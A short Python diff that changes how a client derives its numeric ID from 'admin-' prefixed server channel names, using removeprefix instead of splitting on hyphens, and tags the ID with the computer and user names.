@@ -69,7 +69,7 @@ def handle_connection_to_server(connection):
     print("Connected to server")
     print("Server returned: " + str(connection))
     try:
-        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]
+        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].removeprefix('admin-')
                             .split('@')[0]) + 1) + f'@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'
     except IndexError:
         client_id = f'0@{os.getenv("COMPUTERNAME")}@{os.getenv("UserName")}'[:156]
